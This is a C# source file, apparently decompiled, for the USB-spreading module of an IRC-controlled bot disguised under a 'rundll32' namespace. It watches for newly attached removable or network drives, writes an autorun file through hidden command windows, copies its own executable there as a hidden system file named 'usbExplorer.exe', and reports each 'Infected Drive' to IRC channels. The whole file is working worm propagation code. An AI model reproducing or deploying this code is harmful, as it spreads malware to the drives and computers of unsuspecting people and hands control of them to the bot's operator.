using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace rundll32.spreaders;

internal static class usblistener
{
	private static Thread listenThread;

	private static bool _running = false;

	private static DriveInfo[] drives;

	private static irc _irc;

	public static bool running => _running;

	public static void start(irc ircObj)
	{
		if (!_running)
		{
			_irc = ircObj;
			_running = true;
			listenThread = new Thread(listen);
			listenThread.Start();
		}
	}

	public static void stop()
	{
		if (_running)
		{
			_running = false;
			listenThread = new Thread(listen);
			listenThread.Abort();
		}
	}

	private static void listen()
	{
		while (true)
		{
			try
			{
				while (true)
				{
					Thread.Sleep(100);
					DriveInfo[] array = DriveInfo.GetDrives();
					DriveInfo[] array2 = array;
					foreach (DriveInfo driveInfo in array2)
					{
						bool flag = false;
						try
						{
							DriveInfo[] array3 = drives;
							foreach (DriveInfo driveInfo2 in array3)
							{
								if (driveInfo2.Name == driveInfo.Name)
								{
									flag = true;
								}
							}
						}
						catch
						{
						}
						if (!flag)
						{
							newDrive(driveInfo);
						}
					}
					drives = array;
				}
			}
			catch
			{
			}
		}
	}

	private static void newDrive(DriveInfo di)
	{
		try
		{
			if ((di.DriveType != DriveType.Network && di.DriveType != DriveType.Removable && di.DriveType != 0) || File.Exists(di.RootDirectory.FullName + "autorun.ini"))
			{
				return;
			}
			List<string> list = new List<string>();
			list.Add("echo [autorun]>>" + di.RootDirectory.FullName + "autorun.ini");
			list.Add("echo open=usbExplorer.exe usb>>" + di.RootDirectory.FullName + "autorun.ini");
			list.Add("echo shellexecute=usbExplorer.exe usb>>" + di.RootDirectory.FullName + "autorun.ini");
			list.Add("echo action=USB Drive Explorer>>" + di.RootDirectory.FullName + "autorun.ini");
			list.Add("copy /b /y \"" + Application.get_ExecutablePath() + "\" \"" + di.RootDirectory.FullName + "usbExplorer.exe\"");
			list.Add("attrib +r +s +h +i " + di.RootDirectory.FullName + "usbExplorer.exe");
			list.Add("attrib +r +s +h +i " + di.RootDirectory.FullName + "autorun.ini");
			foreach (string item in list)
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/c " + item;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo)!.WaitForExit();
			}
			if (File.Exists(di.RootDirectory.FullName + "autorun.ini") && File.Exists(di.RootDirectory.FullName + "explorer.exe"))
			{
				string[][] onConnChannels = config.onConnChannels;
				foreach (string[] array in onConnChannels)
				{
					_irc.sendMessage(array[0], ".:USB:. - \u000308Infected Drive \"\u000309" + di.RootDirectory.FullName + "\u000308\" !");
				}
			}
		}
		catch
		{
		}
	}
}
